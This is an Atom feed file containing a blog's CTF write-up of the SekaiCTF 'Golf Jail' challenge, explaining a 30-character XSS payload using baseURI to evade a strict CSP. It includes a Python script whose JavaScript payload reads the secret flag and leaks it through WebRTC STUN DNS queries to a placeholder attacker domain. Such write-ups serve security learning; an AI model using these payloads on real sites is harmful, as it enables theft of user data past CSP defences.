@@ -1,0 +1,129 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-29T21:03:50+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">maitai blog’s</title><subtitle>BSc Computer Science Engineering   Studying</subtitle><entry><title type="html">Golf Jail</title><link href="http://localhost:4000/2023/08/29/sekai23-golf-jail.html" rel="alternate" type="text/html" title="Golf Jail" /><published>2023-08-29T00:00:00+02:00</published><updated>2023-08-29T00:00:00+02:00</updated><id>http://localhost:4000/2023/08/29/sekai23-golf-jail</id><content type="html" xml:base="http://localhost:4000/2023/08/29/sekai23-golf-jail.html">&lt;h1 id=&quot;golf-jail&quot;&gt;Golf Jail&lt;/h1&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;I hope you like golfing ⛳🏌️⛳🏌️&lt;/code&gt; 
+Stats : 16 solves / 475 pts 
+Difficulty: ⭐⭐⭐⭐
+Author: strellic&lt;/p&gt;
+
+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+
+&lt;p&gt;The challenge code is really small, it’s ~24 lines of code&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Security-Policy: default-src &apos;none&apos;; frame-ancestors &apos;none&apos;; script-src &apos;unsafe-inline&apos; &apos;unsafe-eval&apos;;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Cross-Origin-Opener-Policy: same-origin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;nv&quot;&gt;$payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;🚩🚩🚩&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xss&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;is_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xss&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xss&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xss&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SEKAI&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;test_flag&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;is_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;iframe&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;sandbox=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;allow-scripts&quot;&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;srcdoc=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;!-- &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;htmlspecialchars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; --&amp;gt;&amp;lt;div&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;htmlspecialchars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;/div&amp;gt;&quot;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The idea is straightforward here, we need to achieve XSS with just 30 chars and bypassing this really strict CSP&lt;/p&gt;
+
+&lt;h2 id=&quot;day-1---chasing-the-rabbit-down-the-hole&quot;&gt;Day 1 - Chasing the rabbit down the hole&lt;/h2&gt;
+
+&lt;p&gt;Although the idea of the challenge is really simple, it’s really hard to find a proper way to exploit it. 
+The first thing that came to my mind was to look for some really &lt;mark class=&quot;hltr-orange&quot;&gt;tiny XSS payload&lt;/mark&gt; , so i googled for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tiny xss&lt;/code&gt; and looked if i can find something useful.&lt;/p&gt;
+
+&lt;p&gt;With no surprise the shortest payload that i’ve found was &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;svg/onload=eval(name)&amp;gt;&lt;/code&gt; which is 23 chars long. I thought that maybe i can find something even smaller but apparently this is the shortest at the moment.&lt;/p&gt;
+
+&lt;p&gt;How this payload works by the way? It’s &lt;mark class=&quot;hltr-orange&quot;&gt;indeed simple&lt;/mark&gt; because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt; is a shorthand for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;window.name&lt;/code&gt; which is a variable that contains the name of the window in the browsing context.
+The really cool thing is that we can set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;window.name&lt;/code&gt; property using the second parameter of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;window.open&lt;/code&gt; function.
+So if we can make the bot visit a site that we control we can open a new window with an arbitrary name and evaluate it to achieve xss&lt;/p&gt;
+
+&lt;p&gt;But in our case this won’t work, because the bot will only visits url that matches this regex &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/^https:\/\/golfjail\.chals\.sekai\.team\//&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Another payload that i thought about was to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;location.hash&lt;/code&gt; but this will be way more chars than the one allowed
+Looking through https://tinyxss.terjanq.me/ i’ve found about this payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script/src=//Ǌ.₨&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; which is 27 chars long
+But even this one won’t work due to strict CSP which states &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;script-src &apos;unsafe-inline&apos; &apos;unsafe-eval&apos;&lt;/code&gt; so no external scripts allowed&lt;/p&gt;
+
+&lt;p&gt;At this point it started to become frustrating, but suddenly i remembered about a challenge written by &lt;mark class=&quot;hltr-orange&quot;&gt;@aszx87410&lt;/mark&gt; about an XSS with a very strict chars limit&lt;/p&gt;
+
+&lt;p&gt;So i googled &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aszx87410 0222 intigriti&lt;/code&gt; to try to find some new inspiration&lt;/p&gt;
+
+&lt;h3 id=&quot;its-all-about-url&quot;&gt;It’s all about URL&lt;/h3&gt;
+
+&lt;p&gt;The writeup for the &lt;a href=&quot;https://github.com/aszx87410/ctf-writeups/issues/49&quot;&gt;challenge&lt;/a&gt; (and obviously the challenge) is &lt;mark class=&quot;hltr-orange&quot;&gt;really good&lt;/mark&gt;. Here the author consider a payload that i haven’t thought about before&lt;/p&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;svg&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;onload=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;eval(`&apos;`+URL)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;In the writeup is explained perfectly how the payload is supposed to work, and how to craft an url that fits the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval&lt;/code&gt; and can be used to execute javascript code&lt;/p&gt;
+
+&lt;p&gt;All we need to know for the challenge purposes was that if we supply an URL like this ```&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://golfjail.chals.sekai.team/?xss=&amp;lt;svg/onload=eval(`&apos;`+URL)&amp;gt;#&apos;;console.log(1)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The xss parameter will be less than 30 chars, and the URL will be valid syntax to be evaluated from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval&lt;/code&gt; to achieve XSS&lt;/p&gt;
+
+&lt;p&gt;So were is the problem here? It’s simple, &lt;mark class=&quot;hltr-orange&quot;&gt;this won&apos;t work anymore&lt;/mark&gt;. Beacause URL is a function and doesn’t give the URL of the page so this seems like a dead end&lt;/p&gt;
+
+&lt;p&gt;Ok seriously now i was on the verge of a mental breakdown, so i decided that it was better to go to sleep and start the morning after&lt;/p&gt;
+
+&lt;h2 id=&quot;day-2---do-you-believe-in-magic&quot;&gt;Day 2 - Do you believe in magic?&lt;/h2&gt;
+
+&lt;p&gt;It was clear at this point that we need some sort of placeholder in order to bypass the chars limit, and the only thing we can control was the URL only.
+So i started digging into the js documentation, html specification and every kind of blog-post regarding javascript to find the tiniest spark of hope to get XSS&lt;/p&gt;
+
+&lt;p&gt;After 2 or 3 hours of digging in depth of the web and after a bit of fuzzing i’ve found this property &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Node.baseURI&lt;/code&gt; which returns the &lt;mark class=&quot;hltr-orange&quot;&gt;absolute base URL&lt;/mark&gt; of the document containing the node
+This was interesting enough to spend some time on time, but i was completely shocked when from inside the iframe the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;document.baseURI&lt;/code&gt; property returned the location of the &lt;mark class=&quot;hltr-orange&quot;&gt;top window&lt;/mark&gt;&lt;/p&gt;
+
+&lt;p&gt;This literally blew my mind, but now i knew which placeholder i can use to bypass the 30 chars length&lt;/p&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;svg&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;onload=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;eval(`&apos;`+baseURI)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The last thing to mention here is that we can omit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;document&lt;/code&gt; and just use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;baseURI&lt;/code&gt; because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;document&lt;/code&gt; is implicitly used, so the payload will be exactly 30 chars !&lt;/p&gt;
+
+&lt;h3 id=&quot;stealing-strellic-exploit&quot;&gt;Stealing strellic exploit&lt;/h3&gt;
+
+&lt;p&gt;Ok, so we have xss and now we need to exfiltrate the flag. Fortunately this part was easy for me because right from the start i knew a way to bypass that really strict CSP. The way is &lt;mark class=&quot;hltr-orange&quot;&gt;webRTC&lt;/mark&gt; .
+Why do i knew it? From another strellic challenge of course. The challenge was released in the corCTF23 and the name is &lt;a href=&quot;https://brycec.me/posts/corctf_2023_challenges#crabspace&quot;&gt;crabspace&lt;/a&gt;, which basically uses webRTC to exfiltrate data
+So i &lt;s&gt;stolen&lt;/s&gt; borrowed the payload from his writeup and used it to perform exfiltration&lt;/p&gt;
+
+&lt;h2 id=&quot;leaking-all-the-things&quot;&gt;Leaking all the things&lt;/h2&gt;
+
+&lt;p&gt;I’ve automated the exploit due to the fact that i’ve had some hard time to exfiltrate data via webRTC because of some special chars in the flag.
+Basically what i did in the exploit was to take the flag from inside the iframe via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;document.firstChild.textContent&lt;/code&gt; and split it by the underscore to leak it &lt;mark class=&quot;hltr-orange&quot;&gt;word by word&lt;/mark&gt;&lt;/p&gt;
+
+&lt;p&gt;The funny part here is that when i’ve tried to leak the last word of the flag, something didn’t work apparently so my guess was that there will be some special chars at the end of the word that breaks the DNS query
+So i need to tweak my exploit a bit to leak the flag&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://golfjail.chals.sekai.team/?xss=&amp;lt;svg/onload=eval(`&apos;`%2bbaseURI)&amp;gt;#&apos;;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
+var index = 0;
+var pay=document.firstChild.textContent.trim().split(&apos;{&apos;)[1].split(&apos;}&apos;)[0].split(&quot;_&quot;)[index];
+pc = new RTCPeerConnection({&apos;iceServers&apos;:[{&apos;urls&apos;:[&apos;stun:&apos;+pay+&apos;.my_mess_with_dns&apos;]}]});
+pc.createOffer({offerToReceiveAudio:1}).then(o=&amp;gt;pc.setLocalDescription(o));
+&quot;&quot;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;eval(atob(&apos;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&apos;))&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;#SEKAI{jsjails_4re_b3tter_th4n_pyjai1s!}
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Notice that has i’ve said before, you need to change the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index&lt;/code&gt; value every time to leak every word, and for the last word i’ve exfiltrated all of it besides the last char. 
+To be more specific, the last char was exfiltrated by taking is charCode and leaking it, then i
+converted it back to its original value&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;The challenge was really fun to play and i’ve learn a lot of new things. As always strelli challs are a goldmine, definitely want to play the other challenge which is leakless-note in order to learn novel xs-leak technique&lt;/p&gt;</content><author><name></name></author><summary type="html">Golf Jail</summary></entry></feed>
